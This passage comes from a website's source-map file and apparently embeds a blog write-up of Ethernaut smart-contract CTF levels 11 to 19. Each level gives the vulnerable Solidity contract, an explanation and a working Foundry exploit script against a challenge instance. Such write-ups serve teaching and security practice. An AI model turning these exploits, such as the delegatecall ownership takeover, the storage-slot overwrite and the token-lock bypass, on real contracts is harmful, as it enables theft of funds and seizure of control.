public floor;\n\n  function goTo(uint _floor) public {\n    Building building = Building(msg.sender);\n\n    if (! building.isLastFloor(_floor)) {\n      floor = _floor;\n      top = building.isLastFloor(floor);\n    }\n  }\n}\n\\`\\`\\`\n\n\n**Goal:**\n\nWe need to get to the top floor, i.e make the top boolean to true.\n\n**Explanation:**\n\n1. The Elevator calling the isLastFloor() function on msg.sender which is insecure. Dont trust the unknown libraries or contract while making the calls.\n2. The top variable is being updated upon the return value of the isLastFloor() function.\n3. But, To pass the if condition the isLastFloor() should return the false. But the top will become false only if it results false everytime.\n4. We can observe that the isLastFloor() function is being called twice. So, we can write a contract which implements isLastFloor() function in such a way that is returns false on first call and true on second call.\n5. So, that the if condition satisfies  and top will be updated to true.\n\n**Level11Solution.s.sol**\n\n\\`\\`\\`\n\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"../src/Level11.sol\";\nimport \"forge-std/Script.sol\";\nimport \"forge-std/console.sol\";\n\ncontract Level11Sol is Script{\n     Elevator public instance = Elevator(0x8Ad804B2A6907983267C2ef6A962d50F5C63A694);\n    function run() external{\n        vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));\n         new Attack().exploit();\n        vm.stopBroadcast();\n    }\n}\ncontract Attack{\n    Elevator public instance = Elevator(0x8Ad804B2A6907983267C2ef6A962d50F5C63A694);\n    uint public floor;\n    function exploit() external{\n        instance.goTo(3);\n    }\n    function isLastFloor(uint _floor)external returns(bool){\n        if(floor == _floor){\n            return true;           \n        }\n         floor = _floor;\n        return false;\n    }\n}\n\n\\`\\`\\`\n\n\n**To run the script**\n\n\\`\\`\\`\n$ source .env\n$ forge script script/Level11Solution.s.sol:Level11Sol --rpc-url $RPC_URL --broadcast\n\\`\\`\\`\n\n## Privacy\n\n**Level12.sol**\n\n\\`\\`\\`solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ncontract Privacy {\n\n  bool public locked = true;\n  uint256 public ID = block.timestamp;\n  uint8 private flattening = 10;\n  uint8 private denomination = 255;\n  uint16 private awkwardness = uint16(block.timestamp);\n  bytes32[3] private data;\n\n  constructor(bytes32[3] memory _data) {\n    data = _data;\n  }\n  \n  function unlock(bytes16 _key) public {\n    require(_key == bytes16(data[2]));\n    locked = false;\n  }\n\n  \n}\n\n\\`\\`\\`\n\n\n**Goal:**\n\nWe need to unlock the contract, i.e call unlock() function with right password.\n\n**Explanation:**\n\n1. This challenge is similar to Vault. But we need to understand the storage layout of this contract and query the exact passwor storage slot of the contract.\n2. The storage layout of contract as follows :\n    \n    \\`\\`\\`solidity\n    bool public locked = true;                                  // slot 0\n    uint256 public ID = block.timestamp;                        // slot 1\n    uint8 private flattening = 10;                              // slot 2\n    uint8 private denomination = 255;                           // slot 2\n    uint16 private awkwardness = uint16(block.timestamp);       // slot 2\n    bytes32[3] private data;  // data[0] => slot 3`  \n                              // data[1] => slot 4'\n                              // data[2] => slot 5`\n    ```\n    \n3. Password is the lower 16 bytes of the data[2], i.e require(_key == bytes16(data[2]));\n4. Since the data[2] stored at slot 5, we can query it with vm.load cheatcode.\n5. Calling unlock with this password will solve the challenge.\n\n**Level12Solution.s.sol**\n\n\\`\\`\\`solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"../src/Level12.sol\";\nimport \"forge-std/Script.sol\";\nimport \"forge-std/console.sol\";\n\ncontract Level12Sol is Script{\n\n    Privacy public instance = Privacy(0x80AeDd671Abb04118998A8baAd7B879aA53756f9) ;\n\n    function run() external {\n        vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));\n\n        bytes32 slot5_data = vm.load(address(instance),bytes32(uint256(5)));\n        instance.unlock(bytes16(slot5_data));\n\n        vm.stopBroadcast();\n    }\n}\n\\`\\`\\`\n\n**To run the script**\n\n\\`\\`\\`\n$ source .env\n$ forge script script/Level12Solution.s.sol:Level12Sol --rpc-url $RPC_URL --broadcast\n\\`\\`\\`\n\n## Gatekeeper One\n\n**Level13.sol**\n\n\\`\\`\\`solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ncontract GatekeeperOne {\n\n  address public entrant;\n\n  modifier gateOne() {\n    require(msg.sender != tx.origin);\n    _;\n  }\n\n  modifier gateTwo() {\n    require(gasleft() % 8191 == 0);\n    _;\n  }\n\n  modifier gateThree(bytes8 _gateKey) {\n      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), \"GatekeeperOne: invalid gateThree part one\");\n      require(uint32(uint64(_gateKey)) != uint64(_gateKey), \"GatekeeperOne: invalid gateThree part two\");\n      require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), \"GatekeeperOne: invalid gateThree part three\");\n    _;\n  }\n\n  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {\n    entrant = tx.origin;\n    return true;\n  }\n}\n\\`\\`\\`\n\n**Goal:**\n\nMake it past the gatekeeper and register as an entrant to pass this level.\n\n**Explanation:**\n\n1. We have to call the enter() function, without being revert by modifier checks.\n2. We need to pass three modifier checks. We can simply pass gateOne() by calling it from another contract.\n3. To bypass gateTwo() we need to send exact gas that should result the modulo 8191 to zero.\n4. gasLeft() is a method which calculates the remaining gas after executing instructions before it invoked.\n5. We can pass the amount of gas to be transferred to the external call. But we need to send exact amount of gas.\n6. One thing that we can do is bruteforce. By randomly bruteforcing with different values of gas, we can pass this modifier check.\n7. To pass the gateThree() we need to some calculations. It takes the _gateKey a bytes8 value as argument.\n8. The modifiers checks the lower 32 bits of the gatekey after converting to uint64.\n9. So, we can calculate the lower 16 bits of the tx.origin and pad it with zeros to pass the gatThree and gateOne.\n10. Two pass the gateTwo we can add random bits to the MSB position.\n\n**Level13Solution.s.sol**\n\n\\`\\`\\`solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"../src/Level13.sol\";\nimport \"forge-std/Script.sol\";\nimport \"forge-std/console.sol\";\n\ncontract Attack {\n    GatekeeperOne public instance =\n        GatekeeperOne(0xd216C1041909516Dd89a471ECdb96aB3E7ae4Abd);\n\n    function exploit() external {\n        bytes8 gateKey = bytes8(uint64(uint160(tx.origin))) &\n            0xFFFFFFFF0000FFFF;\n        for (uint256 i = 0; i < 300; i++) {\n            uint256 totalgas = i + (8191 * 3);\n            (bool success, ) = address(instance).call{gas: totalgas}(\n                abi.encodeWithSignature(\"enter(bytes8)\", gateKey)\n            );\n            if (success) {\n                break;\n            }\n        }\n    }\n}\n\ncontract Level13Sol is Script {\n    GatekeeperOne public instance =\n        GatekeeperOne(0xd216C1041909516Dd89a471ECdb96aB3E7ae4Abd);\n    function run() external {\n        vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));\n\n        new Attack().exploit();\n\n        vm.stopBroadcast();\n    }\n}\n\n\\`\\`\\`\n\n**To run the script**\n\n\\`\\`\\`\n$ source .env\n$ forge script script/Level13Solution.s.sol:Level13Sol --rpc-url $RPC_URL --broadcast\n\\`\\`\\`\n\n\n## Gatekeeper Two\n\n**Level14.sol**\n\n\\`\\`\\`solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ncontract GatekeeperTwo {\n\n  address public entrant;\n\n  modifier gateOne() {\n    require(msg.sender != tx.origin);\n    _;\n  }\n\n  modifier gateTwo() {\n    uint x;\n    assembly { x := extcodesize(caller()) }\n    require(x == 0);\n    _;\n  }\n\n  modifier gateThree(bytes8 _gateKey) {\n    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);\n    _;\n  }\n\n  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {\n    entrant = tx.origin;\n    return true;\n  }\n}\n\\`\\`\\`\n\n**Goal:**\n\nThis gatekeeper introduces a few new challenges. Register as an entrant to pass this level\n\n**Explanation:**\n\n1. Similiar to gatekeeper one, to pass gateOne() here we need to call from a contract.\n2. gateTwo() checks that the caller contract code should zero. \n3. Code inside contract constructor won’t be stored on blockchain. So, we can call the enter() from our attack contract constructor.\n4. To pass the gateThree() we need to do simple XOR operation. To get the gateKey() we need to do uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) XOR type(uint64).max.\n\n\\`\\`\\`solidity\nWe know that\n \n//If x ^ y = z then x ^ z = y\n\\`\\`\\`\n\n\nLevel14Solution.s.sol\n\n\\`\\`\\`solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"../src/Level14.sol\";\nimport \"forge-std/Script.sol\";\nimport \"forge-std/console.sol\";\n\ncontract Attack{\n    constructor(){ \n        GatekeeperTwo  instance = GatekeeperTwo(0xc3FB4c38f398050206ea0D07D18D693Bc75888AA) ;\n        bytes8 gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);\n        instance.enter(gateKey);\n    }   \n}\ncontract Level14Sol is Script{\n    function run() external{\n        vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));\n        new Attack();\n        vm.stopBroadcast();\n    }\n}\n\n\\`\\`\\`\n\n**To run the script**\n\n\\`\\`\\`\n$ source .env\n$ forge script script/Level14Solution.s.sol:Level14Sol --rpc-url $RPC_URL --broadcast\n\\`\\`\\`\n\n## Naught Coin\n\n**Level15.sol**\n\n\\`\\`\\`solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport 'openzeppelin-contracts/contracts/token/ERC20/ERC20.sol';\n\n contract NaughtCoin is ERC20 {\n\n  // string public constant name = 'NaughtCoin';\n  // string public constant symbol = '0x0';\n  // uint public constant decimals = 18;\n  uint public timeLock = block.timestamp + 10 * 365 days;\n  uint256 public INITIAL_SUPPLY;\n  address public player;\n\n  constructor(address _player) \n  ERC20('NaughtCoin', '0x0') {\n    player = _player;\n    INITIAL_SUPPLY = 1000000 * (10**uint256(decimals()));\n    // _totalSupply = INITIAL_SUPPLY;\n    // _balances[player] = INITIAL_SUPPLY;\n    _mint(player, INITIAL_SUPPLY);\n    emit Transfer(address(0), player, INITIAL_SUPPLY);\n  }\n  \n  function transfer(address _to, uint256 _value) override public lockTokens returns(bool) {\n    super.transfer(_to, _value);\n  }\n\n  // Prevent the initial owner from transferring tokens until the timelock has passed\n  modifier lockTokens() {\n    if (msg.sender == player) {\n      require(block.timestamp > timeLock);\n      _;\n    } else {\n     _;\n    }\n  } \n}\n\\`\\`\\`  \n\n**Goal:**\n\nNaughtCoin is an ERC20 token and you’re already holding all of them. The catch is that you’ll only be able to transfer them after a 10 year lockout period. Can you figure out how to get them out to another address so that you can transfer them freely? Complete this level by getting your token balance to 0.\n\n**Explanation:**\n\n1. NaughtCoin imports ERC20 contract. So, it consists of all the function of ERC20 contract also.\n2. NaughtCoin only implemented the lockTokens() modifier on transfer() function only.\n3. There are other ways to transfer tokens from one address to other without using transfer() function.\n4. Player can approve the allowances of their tokens to someone, and they can use transferFrom() function to transfer tokens on behalf of player.\n\n**Level15Solution.s.sol**\n\n\\`\\`\\`solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"../src/Level15.sol\";\nimport \"forge-std/Script.sol\";\nimport \"forge-std/console.sol\";\n\ncontract Attack {\n    NaughtCoin public instance =\n        NaughtCoin(0x4850cbcf544F3055b6269C54C5e9bD1Ec0905EE2);\n    function exploit(address _player) public {\n        require(instance.allowance(_player, address(this))    > 0, \"Not approved\");\n        require(\n            instance.transferFrom(\n                _player,\n                address(this),\n                instance.balanceOf(_player)\n            ),\n            \"Transfer to attacker failed\"\n        );\n    }\n}\n\ncontract Level15Sol is Script {\n    NaughtCoin public instance =\n        NaughtCoin(0x4850cbcf544F3055b6269C54C5e9bD1Ec0905EE2);\n    function run() external {\n        vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));\n\n        address player = address(instance.player());\n        uint playerBalance = instance.balanceOf(player);\n        Attack attack = new Attack();\n        instance.approve(address(attack), playerBalance); //approving attack contract and balance\n        attack.exploit(player);\n\n        vm.stopBroadcast();\n    }\n}\n\n\\`\\`\\`\n\n**To run the script**\n\n\\`\\`\\`\n$ source .env\n$ forge script script/Level15Solution.s.sol:Level15Sol --rpc-url $RPC_URL --broadcast\n\\`\\`\\`\n\n## Preservation\n\n**Level16.sol**\n\n\\`\\`\\`solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ncontract Preservation {\n\n  // public library contracts \n  address public timeZone1Library;\n  address public timeZone2Library;\n  address public owner; \n  uint storedTime;\n  // Sets the function signature for delegatecall\n  bytes4 constant setTimeSignature = bytes4(keccak256(\"setTime(uint256)\"));\n\n  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {\n    timeZone1Library = _timeZone1LibraryAddress; \n    timeZone2Library = _timeZone2LibraryAddress; \n    owner = msg.sender;\n  }\n \n  // set the time for timezone 1\n  function setFirstTime(uint _timeStamp) public {\n    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));\n  }\n\n  // set the time for timezone 2\n  function setSecondTime(uint _timeStamp) public {\n    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));\n  }\n}\n\n// Simple library contract to set the time\ncontract LibraryContract {\n\n  // stores a timestamp \n  uint storedTime;  \n\n  function setTime(uint _time) public {\n    storedTime = _time;\n  }\n}\n\\`\\`\\`\n\n**Goal:**\nThe goal of this level is for you to claim ownership of the instance you are given.\n\n**Explanation:**\n\n1. Preservation contract uses LibraryContract to set the time in the Preservation contract by using delegatecall.\n2. So, the caller and callee contract storage layout should be matched. If not it may result in storage collision bugs.\n3. Here the Preservation contract doesn’t matches the LibraryContract storage layout.\n4. I observed that calling setSecondTime updates the timeZone1Library address in the Preservation contract.\n5. By exploiting this we can write our own attacker contract that implements the setTime() function and pass that address to the setSecondTime() function so that it will updte the timeZone1Library address in the Preservation contract.\n6. I implemented the Attack contract in such a way that it matches the Preservation storage layout and instead of updating the storedTime, i updated the owner. And that makes our attack contract as the owner of the Preservation contract.\n\n**Level16Solution.s.sol**\n\n\\`\\`\\`solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"../src/Level16.sol\";\nimport \"forge-std/Script.sol\";\nimport \"forge-std/console.sol\";\n\ncontract Attack{\n\n      address public timeZone1Library;\n      address public timeZone2Library;\n      address public owner; \n    \n    function exploit () external{\n          Preservation instance = Preservation(0xA1979400E9bbCEcd6B13aA814281A6B95866A077);\n        //updating the timeZone1Library with attack contract address\n          instance.setFirstTime(uint(uint160(address(this))));\n          /*\n          when we call  the setFirstTime f'n again , \n          it delegatecall to the attack contract and then results in changing the owner to msg.sender\n           */\n          instance.setFirstTime(uint(uint160(msg.sender)));\n    }\n    function setTime(uint _owner) external{\n          owner = address(uint160(_owner));\n    }\n    }\n\ncontract Level16Sol is Script{\n      function run() external{\n            Preservation preservation = Preservation(0xA1979400E9bbCEcd6B13aA814281A6B95866A077);\n            vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));\n            Attack attack = new Attack();\n            attack.exploit();\n            vm.stopBroadcast();\n    }\n}\n\\`\\`\\`\n\n**To run the script**\n\n\\`\\`\\`\n$ source .env\n$ forge script script/Level16Solution.s.sol:Level16Sol --rpc-url $RPC_URL --broadcast\n\\`\\`\\`\n\n## Recovery\n\n**Level17.sol**\n\n\\`\\`\\`solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ncontract Recovery {\n\n  //generate tokens\n  function generateToken(string memory _name, uint256 _initialSupply) public {\n    new SimpleToken(_name, msg.sender, _initialSupply);\n  \n  }\n}\n\ncontract SimpleToken {\n\n  string public name;\n  mapping (address => uint) public balances;\n\n  // constructor\n  constructor(string memory _name, address _creator, uint256 _initialSupply) {\n    name = _name;\n    balances[_creator] = _initialSupply;\n  }\n\n  // collect ether in return for tokens\n  receive() external payable {\n    balances[msg.sender] = msg.value * 10;\n  }\n\n  // allow transfers of tokens\n  function transfer(address _to, uint _amount) public { \n    require(balances[msg.sender] >= _amount);\n    balances[msg.sender] = balances[msg.sender] - _amount;\n    balances[_to] = _amount;\n  }\n\n  // clean up after ourselves\n  function destroy(address payable _to) public {\n    selfdestruct(_to);\n  }\n}\n\\`\\`\\`\n\n**Goal:**\n\nThis level will be completed if you can recover (or remove) the 0.001 ether from the lost contract address.\n\n**Explanation:**\n\n1. The SimpleToken contract is funded with 0.001 ether. We need to drain those ether.\n2. To drain ether we can simply call the destroy() function of the SimpleToken contract.\n3. But we dont have the address of the SimpleToken. We can user ETHERSCAN to identify the transaction of Recovery contract to find the address of the SimpleToken.\n4. We can also use a formula that is mentioned in ethereum yellow paper about how a newly created contract address will be computed.\n5. The formula is address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), address(_creator), bytes1(0x01))))))\n6. 0xd6 and 0x94 are constants and the last byte1 is the nonce, i.e, number contracts created from the existed contract. We assume that its one.\n7. By this formula we can recover the SimpleToken address and call the destroy() function to drain all ether.\n\n**Level17Solution.s.sol**\n\n\\`\\`\\`solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"forge-std/Script.sol\";\nimport \"forge-std/console.sol\";\nimport {Recovery} from \"../src/Level17.sol\";\n\ncontract Level17Sol is Script{\n    Recovery public recovery = Recovery(0x7b9D82e39aa30ddAf4c5a9f132F4834926107Caf);\n    function run() external{\n        vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));\n        address myAddress = address(vm.envAddress(\"MY_ADDRESS\"));\n        Attack attack = new Attack();\n        console.log(\"Attack Address : \", address(attack));\n        console.log(\"MY Balance : \", myAddress.balance);\n        \n        address _creator = address(recovery);\n\n        address token = attack.exploit(_creator, payable(myAddress));\n        \n        console.log(\"Token Address : \", token);\n        console.log(\"MY Balance : \", myAddress.balance);\n\n        vm.stopBroadcast();\n    }\n}\n\ncontract Attack{\n    function exploit(address _creator, address payable _myAddress) public returns(address){\n        address missedToken = address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), address(_creator), bytes1(0x01))))));\n\n        missedToken.call(abi.encodeWithSignature(\"destroy(address)\", _myAddress));\n\n        return missedToken;\n    }\n}\n\\`\\`\\`\n\n**To run the script**\n\n\\`\\`\\`\n$ source .env\n$ forge script script/Level17Solution.s.sol:Level17Sol --rpc-url $RPC_URL --broadcast\n\\`\\`\\`\n\n## Magic Number\n\n**Level18.sol**\n\n\\`\\`\\`solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ncontract MagicNum {\n\n  address public solver;\n\n  constructor() {}\n\n  function setSolver(address _solver) public {\n    solver = _solver;\n  }\n\n}\n\\`\\`\\`\n\n**Goal:**\n\nTo solve this level, you only need to provide the Ethernaut with a Solver, a contract that responds to whatIsTheMeaningOfLife() with the right number. But the solver contract should be very small at most 10 OPCODES.\n\n**Explanation:**\n\n1. To solve this challenge we need to write a contract that return 42. But the contract should be written with at most 10 OPCODES.\n2. We need write our contract in Assembly not in solidity, so that we can build very tiny contract with less OPCODES.\n3. Then we can convert it into bytecode and deploy onto blockchain and then pass the address to the setSolver() function.\n4. Bytecodes are divided into two main types in solidity.\n    1. Runtime bytecode\n    2. Creation bytecode\n5. **Runtime bytecode** will be stored on blockchain and executes when a call happens\n6. **Creation code** consist of **init data**, **runtime data** and **constructor bytecode**. We need to create a runtime code which returns 42 upon call and append it with some init data which is required to deploy a contract.\n7. We can use this creation code to deploy a contract using create opcode and pass the address of the deployed contract to setSolver().\n\n\\`\\`\\`solidity\nOPCODE   |    NAME\n---------|---------\n 0x60    |    PUSH1\n 0x69    |    PUSH10\n 0x52    |    MSTORE\n 0xf3    |    RETURN\n\nRuntime Opcode Creation:\n\nPUSH1 0x2a (602a) - Pushing 42(0x2a) into the stack. Value(v) parameter to MSTORE.\nPUSH1 0x00 (6000) - Pushing 0x00 into the stack. Position(p) parameter to MSTORE.\nMSTORE     (52)   - Store value (0x2a) at position 0x00 in memory.\nPUSH1 0x20 (6020) - Pushing 32 bytes into the stack. Size(s) parameter to RETURN.\nPUSH1 0x00 (6000) - Pushing 0x00 into the stack. Position(p) parameter to RETURN.\nRETURN     (f3)   - Returning value of size (32 bytes) from position (0x00).\n\nConcatenating these opcodes gives the runtime bytecode as 602a60005260206000f3.\n\n\nInitialization Opcode Creation:\n\nPUSH10 0x602a60005260206000f3 (69602a60005260206000f3) - Pushing runtime bytecode into the stack.\n                                                         Value(v) parameter to MSTORE.\n\nPUSH1 0x00 (6000)                                      - Pushing 0x00 into the stack.\n                                                         Position(p) parameter to MSTORE.\n\nMSTORE (52)                                            - Stores runtime bytecode at \n                                                         position 0x00 into memory.  \n\n\nPUSH1 0x0a (600a)                                      - Pushing 10 (length of the runtime code) \n                                                         into the stack. Size(s) parameter to RETURN.\n\nPUSH1 0x16 (6016)                                      - Pushing 22 (offset position) into the stack.\n                                                         Position(p) parameter to RETURN.\n\n\nRETURN (f3)                                            - Returning value of size (10 bytes) \n                                                         from position (22).\n\nConcatenating these opcodes gives the initialization code as 69602a60005260206000f3600052600a6016f3.\n\n\\`\\`\\`\n\n\n\t\t\t\t\t\t\t\t\t\t\t    \n\n**Level18Solution.s.sol**\n\n\\`\\`\\`\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"forge-std/Script.sol\";\nimport \"forge-std/console.sol\";\nimport {MagicNum} from \"../src/Level18.sol\";\n\ncontract Level18Sol is Script{\n    MagicNum public magicNum = MagicNum(0xD5cf766bc937340767d9cf5Fd89eF1C14b78BF9B);\n    function run() external{\n        vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));\n        new Attack().exploit();\n        vm.stopBroadcast();\n\n    }\n}\ncontract Attack{\n    MagicNum public magicNum = MagicNum(0xD5cf766bc937340767d9cf5Fd89eF1C14b78BF9B);\n    function exploit() public{\n        bytes memory bytecode = hex\"69602a60005260206000f3600052600a6016f3\";\n        address _solver;\n          // create(value, offset, size)\n        assembly{\n            _solver:= create(0,add(bytecode,0x20),0x13)\n        }\n        require(_solver != address(0));\n        magicNum.setSolver(_solver);\n    }\n}\n\\`\\`\\`\n\n**To run the script**\n\n\\`\\`\\`\n$ source .env\n$ forge script script/Level18Solution.s.sol:Level18Sol --rpc-url $RPC_URL --broadcast\n\\`\\`\\`\n\n\n## Alien Codex\n\n**Level19.sol**\n\n\\`\\`\\`\n// SPDX-License-Identifier: MIT\npragma solidity ^0.5.0;\n\nimport './helpers/Ownable-05.sol';\n\ncontract AlienCodex is Ownable {\n\n  bool public contact;\n  bytes32[] public codex;\n\n  modifier contacted() {\n    assert(contact);\n    _;\n  }\n  \n  function makeContact() public {\n    contact = true;\n  }\n\n  function record(bytes32 _content) contacted public {\n    codex.push(_content);\n  }\n\n  function retract() contacted public {\n    codex.length--;\n  }\n\n  function revise(uint i, bytes32 _content) contacted public {\n    codex[i] = _content;\n  }\n}\n\\`\\`\\`\n\n**Goal:**\n\nClaim ownership to complete the level.\n\n**Explanation:**\n\n1. When we see the solidity version, it is  0.5.0 and it is prone to  integer overflow/underflow.\n2.  To call any function on the contract we need to call the makeContact() function initially.\n3.  AlineCodex inherits the Ownable contract which has the state variable owner. It will be stored at slot 0 combined with contact boolean variable.\n4. Here, in the slot 1 the legth of the codex array will be stored and it will be updated whenever a new element is pushed onto the array.\n5. AleinCodex also changes the length of the codex with retract() function.\n6. revise() function  allows us to modify any existing element of the codex array. Keep in mind that each element will stored at different storage slot.\n7. Initially the length of the codex is 0. If we call the retract() it will be 0 - 1 which results in underflow and stores the value 2^256 - 1 as the length.\n8. So, now the codex array has access to all the storage slots of the contract. We can use this to update the owner value which is stored at the slot 0.\n9. The codex array elements starts from the slot (keccak256(1)).\n10. We need to pass the index \n 2^256 - 1 - unit(keccack256(1)) + 1 to the revise() function for accessing  the slot 0.\n11. Pass our address in the revise() function along with the index. Then we will become the owner.\n\n\n\\`\\`\\`\n\n\n| Slot Number          | Variables                                                                                          |\n|----------------------|----------------------------------------------------------------------------------------------------|\n| 0                    | - bool public contact<br>- address private _owner<br>- codex[2^256 - 1 - uint(keccak256(1))] + 1 (Access to slot 0)  |\n| 1                    | - codex.length (Number of elements in the dynamic array)                                            |\n| keccak256(1)         | - codex[0] (Array's first element)                                                                 |\n| keccak256(1) + 1     | - codex[1] (Array's second element)                                                                |\n| ...                  | ...                                                                                                |\n| ...                  | ...                                                                                                |\n| ...                  | ...                                                                                                |\n| 2^256 - 1            | - codex[2^256 - 1 - uint(keccak256(1))] (Array's last element)                                      |\n| 0                    | - codex[2^256 - 1 - uint(keccak256(1))] + 1 (got access to slot 0)                                  |\n\n\\`\\`\\`\n\n\n\n`,\n};\n"],"names":[],"mappings":";;;;AAEO,MAAM,iCAAuC;IAClD,MAAM;IACN,OAAO;IACP,SACE;IACF,MAAM;IACN,UAAU;IACV,MAAM;QACJ;QACA;QACA;QACA;QACA;QACA;KACD;IACD,SAAS,CAAC;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;kDA+jCsC,CAAC,AACrB,qBAAqB;IACrB,qBAAqB;IAC/C,CAAC,CAAC,CAAC;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;AAuvBP,CAAC;AACD"}},
    {"offset": {"line": 2039, "column": 0}, "map": {"version":3,"sources":["file:///Users/satyabhaskar/Documents/ShriKrishna/blockchain-developer-portfolio11/lib/blogs/gas-optimization-techniques.ts"],"sourcesContent":["import { Blog } from \"../blog-data\";\n\nexport const gasOptimizationTechniques: Blog = {\n  slug: \"gas-optimization-techniques\",\n  title: \"Advanced Gas Optimization Techniques for Solidity\",\n  excerpt:\n    \"Learn proven strategies to reduce gas costs in your smart contracts without compromising security or functionality.\",\n  date: \"2024-01-10\",\n  readTime: \"10 min read\",\n  tags: [\"Solidity\", \"Optimization\", \"Best Practices\"],\n  content: `# Advanced Gas Optimization Techniques\n\n## Introduction\n\nGas optimization is crucial for creating cost-effective smart contracts. This article covers advanced techniques to minimize gas consumption.\n\n## Key Optimization Strategies\n\n### 1. Storage vs Memory\n\nUnderstanding the difference between storage and memory can lead to significant gas savings.\n\n### 2. Packing Variables\n\nPack variables tightly to reduce storage 